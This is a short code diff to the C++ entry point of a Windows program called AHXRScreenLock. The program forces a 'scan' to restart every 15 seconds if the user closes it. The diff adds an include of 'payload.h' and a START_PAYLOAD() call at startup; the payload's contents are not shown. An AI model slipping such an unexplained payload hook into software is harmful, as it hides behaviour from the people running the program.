@@ -20,7 +20,7 @@
 	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-//#define						DEBUG
+//#define							DEBUG
 
 #include						<string>
 #include						<time.h>
@@ -43,6 +43,7 @@ DWORD WINAPI					t_run_scanner(LPVOID lpParameter);
 DWORD WINAPI					t_run_code_gui(LPVOID lpParameter);
 
 #include						"scan.h"
+#include						"payload.h"
 #include						"frmMain.h"
 #include						"frmCode.h"
 #include						"resource.h"
@@ -58,11 +59,12 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iC
 #endif
 {
 	h_update = CreateThread(0, 0, t_run_scanner, 0, 0, &dh_update);
+	START_PAYLOAD();
 	/*
 		Here is the force-scan. If the client closes the scanner out, the program will
 		automatically scan itself after being closed 15 seconds prior.
 	*/
-
+	
 	while (1)
 	{
 		if (b_closed) { 
@@ -85,6 +87,8 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iC
 		}
 		Sleep(15000);
 	}
+	
+//	return 0;
 }
 
 void showCodeDialog() {
